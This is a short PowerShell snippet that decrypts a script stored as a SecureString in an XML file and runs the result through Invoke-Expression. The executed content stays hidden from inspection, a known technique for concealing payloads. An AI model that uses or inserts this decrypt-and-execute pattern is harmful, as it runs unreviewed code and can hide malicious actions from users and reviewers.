$secureScript = Import-Clixml .\longmail_dynamic_enc.xml
$scriptContent = (New-Object System.Management.Automation.PSCredential("placeholder", $secureScript)).GetNetworkCredential().Password
Invoke-Expression $scriptContent